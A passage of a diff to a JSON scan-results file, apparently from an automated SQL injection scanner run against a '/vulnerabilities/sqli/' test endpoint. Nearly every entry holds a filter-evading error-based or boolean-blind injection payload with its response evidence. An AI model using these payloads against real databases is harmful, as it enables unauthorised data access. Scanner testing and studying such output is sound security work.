+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.04,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=1/**/)||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0575,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0873,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/WHERE/**/1=1/**/aNd/**/1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0868,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/WHERE/**/1=1/**/aNd/**/1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0871,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0563,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0571,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -3091,7 +3045,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0258,
+        "response_time": 0.0572,
         "analysis_details": [
           "[Boolean] Content length changed by 4474 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -3107,17 +3061,17 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/(sElEcT/**/2*(IF((sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))s),/**/8446744073709551610,/**/8446744073709551610)))/**/)||'",
-        "type": "SQLi-error_based",
+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/)||'",
+        "type": "SQLi-boolean_blind",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0389,
+        "response_time": 0.0876,
         "analysis_details": [
-          "[Boolean] Content length changed by 4432 bytes",
-          "[Verified] Logic Swapping (True!=False)"
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
         ],
         "error_log": null
       }
@@ -3130,17 +3084,17 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/)||'",
+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/aNd/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)||'",
         "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0531,
+        "response_time": 0.0874,
         "analysis_details": [
-          "[Boolean] Content length changed by 4471 bytes",
-          "[Verified] Logic Swapping (True!=False)"
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
         ],
         "error_log": null
       }
@@ -3153,17 +3107,17 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)||'",
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1=CONCAT(0x5356534441414141,(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)),0x5641534441414141)/**/)||'",
         "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.1289,
+        "response_time": 0.0875,
         "analysis_details": [
-          "[Boolean] Content length changed by 4474 bytes",
-          "[Verified] Logic Swapping (True!=False)"
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
         ],
         "error_log": null
       }
@@ -3183,9 +3137,55 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0771,
+        "response_time": 0.0864,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1/**/IN/**/(sElEcT/**/(0x5356534441414141+(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END))+0x5641534441414141))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.087,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0772,
+        "analysis_details": [
+          "[Boolean] Content length changed by 4474 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -3206,7 +3206,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0771,
+        "response_time": 0.0877,
         "analysis_details": [
           "[Boolean] Content length changed by 4432 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -3222,7 +3222,7 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)||'",
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
         "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
@@ -3244,14 +3244,36 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)||'",
         "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0122,
+        "response_time": 0.0125,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.02,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -3273,31 +3295,9 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0163,
+        "response_time": 0.0395,
         "analysis_details": [
           "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0285,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -3317,7 +3317,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0567,
+        "response_time": 0.0391,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -3339,7 +3339,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0566,
+        "response_time": 0.0554,
         "analysis_details": [
           "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
         ],
@@ -3361,53 +3361,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0129,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0165,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/oR/**/NOT/**/1=1/**/)||'",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0957,
+        "response_time": 0.0245,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -3430,7 +3384,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0957,
+        "response_time": 0.0286,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -3446,14 +3400,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/2*(IF((sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))s),/**/8446744073709551610,/**/8446744073709551610)))/**/)||'",
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)||'",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0192,
+        "response_time": 0.0172,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -3476,7 +3430,53 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0281,
+        "response_time": 0.022,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/oR/**/NOT/**/1=1/**/)||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0269,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/2*(IF((sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))s),/**/8446744073709551610,/**/8446744073709551610)))/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0128,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -3499,7 +3499,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0237,
+        "response_time": 0.0151,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
           "[Verified] Logic Swapping (True!=False)"
